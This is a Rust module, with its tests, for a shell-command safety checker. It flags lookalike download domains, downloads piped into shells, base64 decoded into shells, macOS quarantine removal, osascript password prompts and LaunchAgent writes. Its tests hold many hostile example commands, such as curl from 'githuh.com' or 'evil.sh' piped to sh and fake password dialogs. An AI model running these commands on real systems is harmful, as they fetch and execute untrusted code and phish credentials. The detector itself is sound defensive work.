//! The before-a-command layer: every rule that needs the command parsed. The text is parsed
//! with a real shell parser and each simple command, at any depth, is judged on its parsed words.

mod analysis;
mod domains;
mod fetch;
mod parse;
mod readers;

use crate::finding::{Evidence, Finding, Layer, Severity};
use analysis::{Limit, Occurrence};
use domains::Verdict;
use parse::Simple;
use readers::FETCHERS;

pub use fetch::stamp_fetch_domain;

pub struct BuiltinRule {
    pub id: &'static str,
    pub title: &'static str,
    pub remediation: &'static str,
    macos_only: bool,
}

const LOOKALIKE: &str = "command/lookalike-download-domain";
const HIDDEN_PROGRAM: &str = "command/hidden-program-into-shell";
const OSASCRIPT: &str = "command/osascript-password-prompt";
const LAUNCH_AGENT: &str = "command/launchagent-write";
const PIPE_TO_SHELL: &str = "command/pipe-to-shell";
const BASE64: &str = "command/base64-into-shell";
const QUARANTINE: &str = "command/quarantine-removal";
const UNPARSABLE: &str = "command/unparsable";
const TOO_DEEP: &str = "command/nesting-too-deep";

pub const RULES: &[BuiltinRule] = &[
    BuiltinRule {
        id: LOOKALIKE,
        title: "The command downloads from a domain that imitates a well-known one",
        remediation: "Type the address yourself from the project's own documentation.",
        macos_only: false,
    },
    BuiltinRule {
        id: HIDDEN_PROGRAM,
        title: "The command pipes into a shell a program whose name is hidden",
        remediation: "Write the program name out in full and read what it prints before piping it to a shell.",
        macos_only: false,
    },
    BuiltinRule {
        id: PIPE_TO_SHELL,
        title: "The command runs a download as a script: it is piped into a shell, or into an interpreter that runs stdin or inline code, or run through $(...) or <(...)",
        remediation: "Download the script to a file, read it, then run it.",
        macos_only: false,
    },
    BuiltinRule {
        id: BASE64,
        title: "The command decodes base64 straight into a shell",
        remediation: "Decode the payload to a file and read it before running anything.",
        macos_only: false,
    },
    BuiltinRule {
        id: QUARANTINE,
        title: "The command removes the macOS quarantine flag, which skips the Gatekeeper check",
        remediation: "Only remove quarantine from software whose source you have verified.",
        macos_only: false,
    },
    BuiltinRule {
        id: UNPARSABLE,
        title: "The command text could not be parsed, so it was not checked",
        remediation: "Fix the quoting or split the command, then check it again.",
        macos_only: false,
    },
    BuiltinRule {
        id: TOO_DEEP,
        title: "The command nests shells or substitutions deeper than the checker follows",
        remediation: "Write the inner command out at the top level and check that.",
        macos_only: false,
    },
    BuiltinRule {
        id: OSASCRIPT,
        title: "The command asks for a password through an osascript dialog",
        remediation: "Legitimate installers use the system's own prompt; do not type a password here.",
        macos_only: true,
    },
    BuiltinRule {
        id: LAUNCH_AGENT,
        title: "The command writes to a LaunchAgents or LaunchDaemons folder, which runs code at every login or boot",
        remediation: "Check what the plist runs before installing it.",
        macos_only: true,
    },
];

/// Programs that write to every path word.
const WRITERS: &[&str] = &["touch", "dd", "curl", "wget", "defaults", "plutil"];
/// Programs whose last path word is the one written.
const COPIERS: &[&str] = &["cp", "mv", "ln", "install", "rsync"];
const LAUNCH_DIRS: &[&str] = &["launchagents", "launchdaemons"];
/// How many levels of `$(...)`, `<(...)`, `sh -c` and `eval` text are analysed again; reaching
/// it is reported, never ignored.
const MAX_DEPTH: usize = 3;

/// Runs the rules that need a parsed command. `macos` says whether the macOS-only rules are
/// active; the engine passes the build platform, tests pass both.
pub fn analyze(command: &str, macos: bool) -> Vec<Finding> {
    let flat = analysis::flatten(command);
    let mut findings = Vec::new();
    for occ in &flat.occurrences {
        findings.extend(lookalike(occ, command));
        findings.extend(pipe_to_shell(occ, command));
        findings.extend(base64_into_shell(occ, command));
        findings.extend(hidden_program(occ, command));
        findings.extend(quarantine(&occ.simple, command));
        if macos {
            findings.extend(osascript(&occ.simple, command));
            findings.extend(launch_agent(&occ.simple, command));
        }
    }
    findings.extend(flat.limits.iter().map(|l| limit_finding(l, command)));
    let mut seen = Vec::new();
    findings.retain(|f| {
        let key = (f.rule_id.clone(), f.severity, f.domain.clone());
        let fresh = !seen.contains(&key);
        seen.push(key);
        fresh
    });
    findings
}

/// Ids of the rules that exist but are not active on this platform.
pub fn skipped_rules(macos: bool) -> Vec<String> {
    if macos {
        return Vec::new();
    }
    RULES
        .iter()
        .filter(|r| r.macos_only)
        .map(|r| r.id.to_string())
        .collect()
}

fn finding(id: &str, severity: Severity, excerpt: &str) -> Finding {
    let rule = RULES.iter().find(|r| r.id == id).expect("known rule id");
    Finding {
        rule_id: rule.id.into(),
        severity,
        layer: Layer::Rules,
        title: rule.title.into(),
        evidence: Evidence::new(None, None, excerpt),
        remediation: rule.remediation.into(),
        domain: None,
        package: None,
        advisories: Vec::new(),
    }
}

fn limit_finding(limit: &Limit, command: &str) -> Finding {
    match limit {
        Limit::Unparsable => finding(UNPARSABLE, Severity::Warn, command),
        Limit::TooDeep { reaches_shell } => finding(
            TOO_DEEP,
            if *reaches_shell {
                Severity::Block
            } else {
                Severity::Warn
            },
            command,
        ),
    }
}

fn is_fetcher(simple: &Simple) -> bool {
    simple.program().is_some_and(|p| FETCHERS.contains(&p))
}

/// Block when the download feeds a shell, warn when it is only fetched or the host cannot be read.
fn lookalike(occ: &Occurrence, command: &str) -> Option<Finding> {
    if !is_fetcher(&occ.simple) {
        return None;
    }
    let (host, verdict) = occ
        .simple
        .arg_texts()
        .filter_map(domains::inspect)
        .find(|(_, v)| *v != Verdict::Clean)?;
    let (severity, what) = match verdict {
        Verdict::Imitates(known) => (
            if occ.feeds_script {
                Severity::Block
            } else {
                Severity::Warn
            },
            format!("{host} imitates {known}"),
        ),
        _ => (Severity::Warn, format!("{host} could not be read")),
    };
    let mut found = finding(LOOKALIKE, severity, &format!("{what}: {command}"));
    found.domain = Some(host);
    Some(found)
}

fn pipe_to_shell(occ: &Occurrence, command: &str) -> Option<Finding> {
    (is_fetcher(&occ.simple) && occ.feeds_script)
        .then(|| finding(PIPE_TO_SHELL, Severity::Warn, command))
}

fn base64_into_shell(occ: &Occurrence, command: &str) -> Option<Finding> {
    (readers::is_decoder(&occ.simple) && occ.feeds_script)
        .then(|| finding(BASE64, Severity::Block, command))
}

/// Warns when a pipeline ends in a shell and a command's program name still holds a `$` or a
/// backtick after unquoting (`$c x | sh`, `$HOME/bin/tool | sh` too: a variable prefix can hide
/// anything), or when `eval` gets a variable expansion. `eval "$(...)"` is not flagged: the
/// substitution is analysed as its own text.
fn hidden_program(occ: &Occurrence, command: &str) -> Option<Finding> {
    let simple = &occ.simple;
    let program_word = &simple.words[simple.program_index()?].text;
    let hidden_into_shell = occ.piped_into_reader && program_word.contains(['$', '`']);
    let eval_of_variable =
        simple.program() == Some("eval") && simple.arg_texts().any(has_variable_expansion);
    (hidden_into_shell || eval_of_variable)
        .then(|| finding(HIDDEN_PROGRAM, Severity::Warn, command))
}

fn has_variable_expansion(arg: &str) -> bool {
    arg.match_indices('$')
        .any(|(i, _)| !arg[i + 1..].is_empty() && !arg[i + 1..].starts_with('('))
}

/// `xattr -c` clears every attribute; `-d` or `-w` aimed at the quarantine attribute removes
/// or rewrites it.
fn quarantine(simple: &Simple, command: &str) -> Option<Finding> {
    if simple.program() != Some("xattr") {
        return None;
    }
    let clusters: Vec<&str> = simple
        .arg_texts()
        .filter_map(|a| a.strip_prefix('-').filter(|c| !c.starts_with('-')))
        .collect();
    let clears = clusters.iter().any(|c| c.contains('c'));
    let rewrites = clusters.iter().any(|c| c.contains(['d', 'w']))
        && simple
            .arg_texts()
            .any(|a| a.contains("com.apple.quarantine"));
    (clears || rewrites).then(|| finding(QUARANTINE, Severity::Warn, command))
}

fn osascript(simple: &Simple, command: &str) -> Option<Finding> {
    if simple.program() != Some("osascript") {
        return None;
    }
    let script = simple
        .words
        .iter()
        .map(|w| w.text.as_str())
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase();
    let asks = script.contains("hidden answer")
        || (script.contains("display dialog") && script.contains("password"));
    asks.then(|| finding(OSASCRIPT, Severity::Block, command))
}

fn launch_agent(simple: &Simple, command: &str) -> Option<Finding> {
    let writes = written_paths(simple)
        .into_iter()
        .chain(simple.attached.written_files.iter().map(String::as_str))
        .any(in_launch_dir);
    writes.then(|| finding(LAUNCH_AGENT, Severity::Block, command))
}

/// Whether the path has `Library/LaunchAgents` or `Library/LaunchDaemons` as consecutive
/// components, so a sibling such as `LaunchAgents.bak` does not match.
fn in_launch_dir(path: &str) -> bool {
    let lower = path.to_lowercase();
    let parts: Vec<&str> = lower.split('/').collect();
    parts
        .windows(2)
        .any(|w| w[0] == "library" && LAUNCH_DIRS.contains(&w[1]))
}

/// The words a program writes to, as far as its name tells: the destination of a copy, every
/// file of `tee`, any path word of the other writers.
fn written_paths(simple: &Simple) -> Vec<&str> {
    let Some(program) = simple.program() else {
        return Vec::new();
    };
    let args: Vec<&str> = simple.arg_texts().collect();
    let mut operands = args.iter().copied().filter(|a| !a.starts_with('-'));
    if program == "tee" {
        operands.collect()
    } else if COPIERS.contains(&program) {
        let target = args.iter().enumerate().find_map(|(i, a)| match *a {
            "-t" | "--target-directory" => args.get(i + 1).copied(),
            _ => a.strip_prefix("--target-directory="),
        });
        target
            .or_else(|| operands.next_back())
            .into_iter()
            .collect()
    } else if WRITERS.contains(&program) {
        args
    } else {
        Vec::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(command: &str, macos: bool) -> Vec<(String, Severity)> {
        analyze(command, macos)
            .into_iter()
            .filter(|f| f.rule_id != PIPE_TO_SHELL)
            .map(|f| (f.rule_id, f.severity))
            .collect()
    }

    #[test]
    fn a_lookalike_piped_into_a_shell_blocks() {
        assert_eq!(
            ids("curl -fsSL githuh.com/install.sh | sudo bash", false),
            [(LOOKALIKE.to_string(), Severity::Block)]
        );
    }

    #[test]
    fn a_lookalike_only_downloaded_warns() {
        assert_eq!(
            ids("wget https://brev.sh/install -O i.sh", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn the_known_domain_is_clean() {
        assert!(ids("curl -fsSL https://brew.sh/install | bash", false).is_empty());
    }

    #[test]
    fn a_lookalike_in_a_command_that_does_not_fetch_is_ignored() {
        assert!(ids("echo githuh.com | sh", false).is_empty());
    }

    #[test]
    fn macos_rules_run_only_when_enabled() {
        let cmd = "osascript -e 'display dialog \"x\" with hidden answer'";
        assert!(ids(cmd, false).is_empty());
        assert_eq!(ids(cmd, true), [(OSASCRIPT.to_string(), Severity::Block)]);
        assert!(ids("echo x >> ~/Library/LaunchAgents/a.plist", false).is_empty());
    }

    #[test]
    fn skipped_rules_name_the_macos_only_ids() {
        assert_eq!(skipped_rules(false), [OSASCRIPT, LAUNCH_AGENT]);
        assert!(skipped_rules(true).is_empty());
    }

    #[test]
    fn launch_agent_reads_are_not_writes() {
        for cmd in [
            "ls ~/Library/LaunchAgents",
            "cat ~/Library/LaunchAgents/a.plist > /tmp/out",
        ] {
            assert!(ids(cmd, true).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn launch_agent_writes_are_found_by_redirect_and_by_program() {
        for cmd in [
            "echo x >> ~/Library/LaunchAgents/a.plist",
            "echo x >$HOME/Library/LaunchAgents/a.plist",
            "cp a.plist $HOME/Library/LaunchAgents/",
            "echo x | tee /Library/LaunchAgents/a.plist",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
    }

    fn block() -> [(String, Severity); 1] {
        [(LOOKALIKE.to_string(), Severity::Block)]
    }

    #[test]
    fn a_known_host_with_a_trailing_dot_is_clean() {
        assert!(ids("curl https://brew.sh./install | sh", false).is_empty());
    }

    #[test]
    fn real_sibling_sites_are_clean() {
        for cmd in [
            "curl https://gitlab.com/x/install.sh | sh",
            "curl https://docker.io/install | sh",
        ] {
            assert!(ids(cmd, false).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn a_download_reaching_a_shell_blocks_however_it_is_spelled() {
        for cmd in [
            "curl https://githuh.com/x | tee x | sh",
            "curl https://githuh.com/x | sudo -u root bash",
            "curl https://githuh.com/x | /usr/bin/env bash",
            "curl https://githuh.com/x | env -i FOO=1 bash",
            "curl https://githuh.com/x | nohup bash",
            "curl https://githuh.com/x | exec bash",
            "curl https://githuh.com/x | command bash",
            "curl https://githuh.com/x | xargs sh",
            "curl https://githuh.com/x | time nice -n 5 sh",
            "curl --url=https://githuh.com/x | sh",
            "curl --url https://githuh.com/x | sh",
            "curl https://githuh.com/x | fish",
            "curl https://githuh.com/x | python3",
            "curl https://githuh.com/x | python3 -",
            "curl https://githuh.com/x |& bash",
        ] {
            assert_eq!(ids(cmd, false), block(), "{cmd}");
        }
    }

    #[test]
    fn a_download_into_an_interpreter_that_is_given_a_script_only_warns() {
        let cmd = "curl https://githuh.com/x | python3 tool.py";
        assert_eq!(ids(cmd, false), [(LOOKALIKE.to_string(), Severity::Warn)]);
    }

    #[test]
    fn a_shell_on_a_later_command_does_not_make_the_download_block() {
        assert_eq!(
            ids("curl githuh.com/x ; sh", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
        assert_eq!(
            ids("curl githuh.com/x && bash", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn a_download_inside_a_shell_argument_is_judged_into_a_shell() {
        for cmd in [
            "sh -c \"$(curl https://githuh.com/x)\"",
            "bash <(curl https://githuh.com/x)",
            "bash -c \"curl https://githuh.com/x | sh\"",
            "eval \"$(curl https://githuh.com/x)\"",
            r#"sh -c "$(sh -c "$(curl https://githuh.com/x)")""#,
        ] {
            assert_eq!(ids(cmd, false), block(), "{cmd}");
        }
    }

    fn nested(levels: usize) -> String {
        let wrap = |inner: String| format!("sh -c {}", shlex::try_quote(&inner).unwrap());
        let mut cmd = "curl https://githuh.com/x | sh".to_string();
        for _ in 0..levels {
            cmd = wrap(cmd);
        }
        cmd
    }

    #[test]
    fn nesting_is_followed_to_the_limit_and_the_limit_is_a_finding() {
        assert_eq!(ids(&nested(MAX_DEPTH - 1), false), block());
        assert_eq!(
            ids(&nested(MAX_DEPTH), false),
            [(TOO_DEEP.to_string(), Severity::Block)]
        );
        assert_eq!(
            ids(&nested(MAX_DEPTH + 2), false),
            [(TOO_DEEP.to_string(), Severity::Block)]
        );
    }

    #[test]
    fn nesting_past_the_limit_without_a_shell_only_warns() {
        let cmd = "sh -c \"sh -c \\\"sh -c 'echo hi'\\\"\"";
        assert_eq!(ids(cmd, false), [(TOO_DEEP.to_string(), Severity::Warn)]);
    }

    #[test]
    fn nested_substitutions_and_process_substitutions_count_toward_the_limit() {
        let sub = "echo $(echo $(echo $(echo $(sh))))";
        assert_eq!(ids(sub, false), [(TOO_DEEP.to_string(), Severity::Block)]);
        let proc = "cat <(cat <(cat <(cat <(sh))))";
        assert_eq!(ids(proc, false), [(TOO_DEEP.to_string(), Severity::Block)]);
    }

    #[test]
    fn a_single_quoted_substitution_in_a_shell_text_is_output_not_script() {
        assert_eq!(
            ids("sudo bash -c 'echo `curl https://githuh.com/x`'", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn a_clean_substitution_in_a_shell_is_clean() {
        assert!(ids("sh -c \"$(curl https://brew.sh/install)\"", false).is_empty());
    }

    #[test]
    fn an_unreadable_host_warns() {
        let cmd = "curl https://exa\u{2028}mple..com/x | sh";
        assert_eq!(ids(cmd, false), [(LOOKALIKE.to_string(), Severity::Warn)]);
    }

    #[test]
    fn invisible_characters_in_a_known_name_block() {
        let cmd = "curl https://git\u{200b}hub.com/x | sh";
        assert_eq!(ids(cmd, false), block());
    }

    #[test]
    fn userinfo_with_a_port_is_still_a_spoof() {
        let cmd = "curl \"https://github.com:443@evil.io/\" | sh";
        assert_eq!(ids(cmd, false), block());
    }

    #[test]
    fn glued_redirects_are_split_before_taking_targets() {
        for cmd in [
            "echo x>~/Library/LaunchAgents/x.plist",
            "echo x>>~/Library/LaunchAgents/x.plist",
            "echo x 1>~/Library/LaunchAgents/x.plist",
            "echo x &>~/Library/LaunchAgents/x.plist",
            "echo x > ~/Library/LaunchDaemons/x.plist",
            "echo x | tee -a /Library/LaunchDaemons/x.plist",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
        assert!(ids("echo '>~/Library/LaunchAgents/x'", true).is_empty());
    }

    #[test]
    fn copies_are_judged_by_their_destination() {
        for cmd in [
            "cp ~/Library/LaunchAgents/a /tmp/",
            "mv -f ~/Library/LaunchAgents/a.plist ./",
            "rsync -a /Library/LaunchDaemons/a.plist /tmp/x",
            "cat ~/Library/LaunchAgents/a | tee /tmp/x",
        ] {
            assert!(ids(cmd, true).is_empty(), "{cmd}");
        }
        for cmd in [
            "cp -t ~/Library/LaunchAgents a.plist",
            "cp a.plist --target-directory=$HOME/Library/LaunchAgents",
            "install -m 644 a.plist ~/Library/LaunchAgents/",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
    }

    #[test]
    fn a_script_in_a_file_is_a_known_limit() {
        assert!(ids("osascript hidden.scpt", true).is_empty());
        assert!(ids("cat x | osascript", true).is_empty());
    }

    fn hidden(command: &str) -> bool {
        ids(command, false)
            .iter()
            .any(|(id, _)| id == HIDDEN_PROGRAM)
    }

    #[test]
    fn a_program_name_hidden_in_a_dollar_form_warns_when_piped_into_a_shell() {
        for cmd in [
            r"$'\x63url' https://example.org/a | sh",
            "c=curl; $c https://example.org/a | sh",
            "$(echo curl) https://example.org/a | sh",
            "`echo curl` https://example.org/a | bash",
            "$c x | tee f | sh",
            "sh -c '$c x | sh'",
        ] {
            assert!(hidden(cmd), "{cmd}");
        }
        assert_eq!(
            ids("$c x | sh", false),
            [(HIDDEN_PROGRAM.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn a_dollar_path_prefix_counts_as_hidden() {
        assert!(hidden("$HOME/bin/tool | sh"));
    }

    #[test]
    fn eval_of_a_variable_warns_but_a_literal_or_a_substitution_does_not() {
        assert!(hidden(r#"eval "$x""#));
        assert!(hidden("eval ${x}"));
        assert!(!hidden("eval 'echo hi'"));
        assert!(!hidden(r#"eval "$(ssh-agent -s)""#));
        assert!(!hidden("eval $"));
    }

    #[test]
    fn a_dollar_that_is_not_a_program_or_does_not_reach_a_shell_is_ignored() {
        assert!(!hidden("$c x"));
        assert!(!hidden("echo $HOME | sh"));
        assert!(!hidden("$c x | cat"));
        assert!(!hidden("curl x | sh"));
    }

    #[test]
    fn a_literal_eval_argument_is_analysed_like_a_shell_c_text() {
        assert_eq!(
            ids(r#"eval "curl https://githuh.com/i | sh""#, false),
            ids(r#"sh -c "curl https://githuh.com/i | sh""#, false)
        );
        assert!(
            ids(r#"eval "curl https://githuh.com/i | sh""#, false)
                .contains(&(LOOKALIKE.to_string(), Severity::Block))
        );
    }

    #[test]
    fn eval_text_reaches_the_osascript_rule() {
        let cmd = r#"eval "osascript -e 'display dialog \"x\" with hidden answer'""#;
        assert_eq!(ids(cmd, true), [(OSASCRIPT.to_string(), Severity::Block)]);
    }

    #[test]
    fn eval_text_reaches_the_launchagent_rule() {
        let cmd = r#"eval "echo x >> ~/Library/LaunchAgents/a.plist""#;
        assert_eq!(
            ids(cmd, true),
            [(LAUNCH_AGENT.to_string(), Severity::Block)]
        );
    }

    fn blocks(command: &str) -> bool {
        ids(command, false).contains(&(LOOKALIKE.to_string(), Severity::Block))
    }

    fn rule_ids(command: &str) -> Vec<String> {
        analyze(command, false)
            .into_iter()
            .map(|f| f.rule_id)
            .collect()
    }

    #[test]
    fn a_lookalike_download_to_a_shell_blocks_in_every_list_and_group_form() {
        for cmd in [
            "echo a\ncurl githuh.com/x | sh",
            "true; curl githuh.com/x | sh",
            "true && curl githuh.com/x | sh",
            "false || curl githuh.com/x | sh",
            "(curl githuh.com/x | sh)",
            "{ curl githuh.com/x | sh; }",
            "if true; then curl githuh.com/x | sh; fi",
            "while true; do curl githuh.com/x | sh; done",
            "(curl githuh.com/x) | sh",
            "{ curl githuh.com/x; } | bash",
            "curl githuh.com/x|sh",
            "echo \"$(curl githuh.com/x | sh)\"",
            "echo `curl githuh.com/x | sh`",
            "echo $(echo \")\"; curl githuh.com/x | sh)",
        ] {
            assert!(blocks(cmd), "{cmd}");
        }
    }

    #[test]
    fn a_lookalike_download_into_each_script_reader_form_blocks_like_a_shell() {
        for reader in [
            "sh",
            "(sh)",
            "{ sh; }",
            "busybox sh",
            "doas sh",
            "python3 -c 'import sys'",
            "perl -pe 's/a/b/'",
            "ruby -e 'puts 1'",
            "node -e 'x'",
            "python3 -",
            "source /dev/stdin",
            ". /dev/stdin",
            "tee >(sh)",
            "tee x | sh",
            "xargs sh -c 'echo'",
            "sudo -u root bash",
            "env -i bash",
            "/usr/bin/env bash",
            "if true; then sh; fi",
        ] {
            let cmd = format!("curl githuh.com/x | {reader}");
            assert!(blocks(&cmd), "{cmd}");
        }
    }

    #[test]
    fn a_download_into_something_that_is_not_a_reader_does_not_block() {
        for reader in [
            "tee out",
            "less",
            "python3 tool.py",
            "perl script.pl",
            "source ./file",
            "cat >(wc)",
            "{ cat; }",
            "busybox ls",
        ] {
            let cmd = format!("curl githuh.com/x | {reader}");
            assert!(!blocks(&cmd), "{cmd}");
        }
    }

    #[test]
    fn a_decoder_reaching_a_script_reader_blocks() {
        for cmd in [
            "echo aGk= | base64 -d | sh",
            "echo aGk= | base64 -d | (sh)",
            "echo aGk= | base64 -d | { sh; }",
            "echo aGk= | base64 -d | busybox sh",
            "echo aGk= | base64 -d | python3",
            "echo aGk= | base64 -d | perl",
            "echo aGk= | base64 -d | fish",
            "echo aGk= | base64 -d | /usr/bin/env bash",
            "echo aGk= | base64 -d | env -i bash",
            "echo aGk= | base64 -d | sudo -u root bash",
            "echo aGk= | base64 -d | xargs sh -c 'echo'",
            "echo aGk= | base64 -d | tee x | sh",
            "echo aGk= | base64 -di | sh",
            "echo aGk= | base64 -D | sh",
            "echo aGk= | base64 --decode | sh",
            "echo 6869 | xxd -r -p | sh",
            "eval \"$(echo aGk= | base64 -d)\"",
            "eval $(echo aGk= | base64 -d)",
            "sh -c \"$(echo aGk= | base64 -d)\"",
            "bash <(echo aGk= | base64 -d)",
            "echo ok\necho aGk= | base64 -d | sh",
            "(echo aGk= | base64 -d | sh)",
        ] {
            assert!(rule_ids(cmd).contains(&BASE64.to_string()), "{cmd}");
        }
    }

    #[test]
    fn a_decoder_that_is_not_run_is_not_a_finding() {
        for cmd in [
            "base64 -d notes.b64 > notes.txt",
            "echo hi | base64",
            "echo aGk= | base64 -d | shasum -a 256",
            "echo aGk= | base64 -d > out.txt",
            "echo aGk= | base64 -d ; sh",
            "eval \"$(echo hi)\"",
        ] {
            assert!(!rule_ids(cmd).contains(&BASE64.to_string()), "{cmd}");
        }
    }

    #[test]
    fn text_that_only_mentions_a_command_is_not_a_finding() {
        for cmd in [
            "grep -r \"base64 -d | sh\" .",
            "git commit -m \"fix curl | sh handling\"",
            "echo 'curl https://githuh.com/x | sh'",
            "echo \"xattr -cr Demo.app\"",
        ] {
            assert!(rule_ids(cmd).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn launch_dirs_match_as_path_components() {
        assert!(ids("cp plist ~/Library/LaunchAgents.bak/x", true).is_empty());
        assert!(ids("cp plist ~/Library/LaunchAgentsX/x", true).is_empty());
        assert_eq!(ids("cp plist ~/Library/LaunchAgents/x", true).len(), 1);
        assert_eq!(ids("cp plist /Library/launchdaemons/x", true).len(), 1);
    }

    #[test]
    fn a_download_run_through_each_substitution_form_is_pipe_to_shell() {
        for cmd in [
            r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
            r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
            r#"eval "$(curl -fsSL https://evil.sh/a)""#,
            r#"eval $(curl -fsSL https://evil.sh/a)"#,
            "bash <(curl -s https://evil.sh/a)",
            "bash < <(curl -s https://evil.sh/a)",
            "source <(curl -s https://evil.sh/a)",
            ". <(curl -s https://evil.sh/a)",
            r#"sh -c 'bash <(curl -s https://evil.sh/a)'"#,
            "sh <<< \"$(curl -s https://evil.sh/a)\"",
            "curl -s https://evil.sh/a | python3",
            "curl -s https://evil.sh/a | python -",
            "wget -qO- https://evil.sh/a | sudo perl",
            "curl -s https://evil.sh/a | ruby",
            "curl -s https://evil.sh/a | node",
            "curl -s https://evil.sh/a | python3 -c 'import sys'",
        ] {
            assert!(rule_ids(cmd).contains(&PIPE_TO_SHELL.to_string()), "{cmd}");
        }
    }

    #[test]
    fn a_download_that_does_not_run_is_not_pipe_to_shell() {
        for cmd in [
            "curl -s https://evil.sh/a | python3 tool.py",
            r#"sh -c "$(cat install.sh)""#,
            "sh -c 'echo $(curl -s https://evil.sh/a)'",
            r#"echo "$(curl -s https://evil.sh/a)""#,
            "bash <(cat f)",
            "source <(echo hi)",
            r#"eval "$(ssh-agent -s)""#,
            "curl -s https://evil.sh/a -o a.sh",
            "curl -s https://evil.sh/a ; sh",
        ] {
            assert!(!rule_ids(cmd).contains(&PIPE_TO_SHELL.to_string()), "{cmd}");
        }
    }

    #[test]
    fn a_here_document_into_a_shell_is_followed() {
        let cmd = "sh <<EOF\ncurl githuh.com/x | sh\nEOF";
        assert!(blocks(cmd));
    }

    #[test]
    fn unparsable_text_is_a_warning_never_clean() {
        for cmd in ["curl 'oops | sh", "echo $(", "a ||", "sh -c 'echo \"x'"] {
            assert_eq!(
                ids(cmd, false),
                [(UNPARSABLE.to_string(), Severity::Warn)],
                "{cmd}"
            );
        }
        assert!(ids("", false).is_empty());
    }

    #[test]
    fn quarantine_flags_are_read_from_the_parsed_words() {
        assert!(rule_ids("xattr -cr Demo.app").contains(&QUARANTINE.to_string()));
        assert!(rule_ids("xattr -rd com.apple.quarantine A.app").contains(&QUARANTINE.to_string()));
        assert!(!rule_ids("xattr -l Demo.app").contains(&QUARANTINE.to_string()));
        assert!(!rule_ids("xattr -d com.example.foo f").contains(&QUARANTINE.to_string()));
    }
}
